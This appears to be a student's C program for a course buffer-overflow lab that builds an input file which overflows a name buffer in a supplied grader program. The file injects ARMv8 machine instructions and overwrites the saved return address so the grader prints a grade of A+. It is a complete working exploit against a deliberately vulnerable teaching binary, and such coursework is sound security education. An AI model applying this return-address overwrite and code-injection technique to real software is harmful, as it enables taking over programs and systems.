/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Tom Wang and Ty Lipscomb                                   */
/*--------------------------------------------------------------------*/

/* Produces a file called dataA with the student name, padding to
   align to 4 bytes, four ARMv8 machine-language instructions
   (adr, mov, strb, b) that store 'A' into the grade variable and
   then branch to main's "is your grade" printf, more padding to
   overrun the stack, and the address of the first injected
   instruction, which will overwrite getName's saved x30 so that
   getName returns into the injected code in the name array. */

#include <stdio.h>
#include "miniassembler.h"


/* Takes no command-line arguments. Reads nothing from stdin. Writes
   nothing to stdout or stderr. Writes bytes to a file named
   "dataAplus" that, when supplied as input to the grader program
   (via grader.sh), will cause the grader to award a grade of A+.
   Returns 0. */

int main(void) {
    int i;
    unsigned int uiInstr;
    
/*
adr x0, addr of A string 'A' and '\0'
bl printf     printf then return to next line since bl now
adr  x0, 0x420044        x0 = address of `grade`
mov  w1, #0x41      w1 = 'A'
strb w1, [x0]        *grade = 'A'
b    0x40089c      jump to main+64 

|0x420044  |0x44    |grade      | from memorymap
|0x420058	|name[0 - 3]    | from mem oyrmap

printf("%c is your grade.\n", grade);
0x40089c <main+64>:  adrp    x0, 0x420000 <__libc_start_main@got.plt>

*/
    const unsigned long grade_addr = 0x420044UL; /* addr of grade above*/
    const unsigned long name_addr  = 0x420058UL; /* addr of name above*/
    const unsigned long printf_addr = 0x400690UL; /* addr of printf */
    const unsigned long is_grade_addr   = 0x40089cUL; /* addr of the start if printing is grade */

    /* The literal "A" format string sits 28 bytes into name. */
    const unsigned long a_string_addr   = 0x420058UL + 28UL;


    FILE *psFile;
    psFile = fopen("dataAplus", "w");

    /* The student name. These three bytes are read into buf[0..2]
       and later copied into the name array in the bss section so
       the grader prints "Thank you, Ty." */
    putc('T', psFile);
    putc('y', psFile);
    putc('\0', psFile);
    putc('\0', psFile);

   /* bytes 4-7 adr x0, 0x420074
   in this iteration loads the A string into x0 (A is stored 24 lines after this)*/
   uiInstr = MiniAssembler_adr(0, a_string_addr, name_addr + 4);
   fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

   /* bytes 8-11 bl 0x400690 
   in this iteration it immedietly artificially calls printf('A). we had to add bl
   because bl automatically stores the address of the next instruction we are encoding into x30
   which tells the system where to go next otherwise this wouldnt work. */
   uiInstr = MiniAssembler_bl(printf_addr, name_addr + 8);
   fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

   /* bytes 12-15 executing adr x0, 0x420044 moving grade address to x0 
   stores the instruction 4 bytes after name accordingly*/
   uiInstr = MiniAssembler_adr(0, grade_addr, name_addr + 12);
   fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

   /* bytes 16-19 executes mov w1, #0x2B which jsut stores the value for '+' into w1*/
   uiInstr = MiniAssembler_mov(1, 0x2B);
   fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

   /* Bytes 20-23 executes
   strb w1, [x0] whic store the byte '+' at the address of grade */
   uiInstr = MiniAssembler_strb(1, 0);
   fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

   /* bytes 24-27 executes b 0x40089c which is the jump to the location of printf
   so that the grade prints "+ is your grade." since we already printed A, this should work great
   stores the insturction 16 bytes after name since this is the 4th instruction
   */
   uiInstr = MiniAssembler_b(is_grade_addr, name_addr + 24);
   fwrite(&uiInstr, sizeof(uiInstr), 1, psFile);

   /* Bytes 28-29 this stores the actual A string plus the empty string stored after the instruction calls*/
   putc('A', psFile);
   putc('\0', psFile);
   
   /* 18 null bytes. This acts as padding since the first 30 store the name, null byte, print A
   and the 24 inctruction bytes involved with that. the rest is stored in name but too long for printf
   18 +30 = 48 buffer boom*/
   for (i = 0; i < 18; i++) {
      putc(0x00, psFile);
   }

   /* Bytes 48-55: 8 bytes, little-endian, forming the address
       0x000000000042005C = name_addr + 4. Overwrites getName's
       saved x30, so that when getName returns, control jumps to
       the first injected instruction.  */
   putc(0x5C, psFile);
   putc(0x00, psFile);
   putc(0x42, psFile);
   putc(0x00, psFile);
   putc(0x00, psFile);
   putc(0x00, psFile);
   putc(0x00, psFile);
   putc(0x00, psFile);
   
   return 0;
}
